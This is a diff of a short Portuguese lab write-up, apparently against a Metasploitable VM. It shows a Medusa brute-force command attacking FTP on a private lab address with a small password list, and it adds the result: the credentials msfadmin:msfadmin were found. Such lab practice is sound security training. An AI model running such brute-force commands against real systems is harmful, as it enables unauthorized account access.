@@ -29,3 +29,12 @@ printf "123456\npassword\nqwerty\nmsfadmin\n" > pass.txt
 Execução do ataque
 
 Comando Medusa: `medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6 -f`
+
+Resultado: credenciais válidas encontradas: msfadmin:msfadmin.
+
+
+## 
+
+Simples e direto ;)
+
+
